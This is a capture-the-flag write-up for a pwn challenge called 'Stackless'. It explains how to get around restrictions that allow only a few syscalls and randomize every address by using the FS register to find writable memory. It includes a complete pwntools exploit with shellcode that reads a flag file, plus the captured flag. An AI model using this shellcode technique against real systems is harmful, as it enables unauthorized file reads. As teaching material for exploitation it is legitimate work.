# Stackless

## Challenge

We are given source code and a binary for the challenge.

It loads a given shellcode into a random address in memory and clears all registers before jumping to it.

All standard mitigations are enabled, so both the exe and library addresses are randomized.

Also, we are restricted to the following syscalls:

- read
- write
- open
- close
- exit
- exit\_group

## Solution

The challenge is that we cannot read the flag onto the stack with our shellcode, as we do not know where the stack is.
The same is true for data sections, as we do not know the addresses of exe or libc.

However, we can access FS to get a writable address.

Using the pointer from FS, we can read the flag into a writable address, then print it using the write syscall.

## Exploit

```py
#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('stackless')

host = args.HOST or 'challenge.nahamcon.com'
port = int(args.PORT or 32721)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

shellcode = b""

shellcode += asm('lea rdi, [rip + 0x800 - 7]')
shellcode += asm('mov rsi, 0')
shellcode += asm('mov rax, SYS_open')
shellcode += asm('syscall')

shellcode += asm('mov rdi, rax')
shellcode += asm('mov rsi, fs:[0]')
shellcode += asm('mov rdx, 0x40')
shellcode += asm('mov rax, SYS_read')
shellcode += asm('syscall')

shellcode += asm('mov rdi, 1')
shellcode += asm('mov rax, SYS_write')
shellcode += asm('syscall')

payload = flat({
    0: shellcode,
    0x800: b"/home/challenge/flag.txt",
    })

io.sendlineafter(b"Shellcode length\n", str(len(payload)).encode())
io.sendlineafter(b"Shellcode\n", payload)

io.interactive()
```

## Flag

```
flag{2e5016f202506a14de5e8d2c7285adfa}
```
